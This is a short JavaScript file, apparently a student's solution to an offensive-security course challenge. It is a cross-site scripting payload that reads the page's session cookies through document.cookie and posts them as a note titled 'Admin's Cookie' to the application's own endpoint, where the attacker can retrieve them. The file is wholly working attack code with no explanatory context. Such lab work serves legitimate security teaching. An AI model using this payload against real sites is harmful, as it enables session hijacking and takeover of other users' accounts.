// NetID; yc5109

// Attempting to Get Session Cookies
const url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/"
const currentCookies = document.cookie;
console.log(currentCookies);

// New Form Data Generation
const formData = new FormData();
formData.append("title", "Admin's Cookie");
formData.append("content", currentCookies);

const request = new XMLHttpRequest();
request.open("POST", "note/new", true);
request.setRequestHeader('Content-Type', 'application/json');
request.send(JSON.stringify({
  "title": "Admin's Cookie",
  "content": currentCookies,
}));
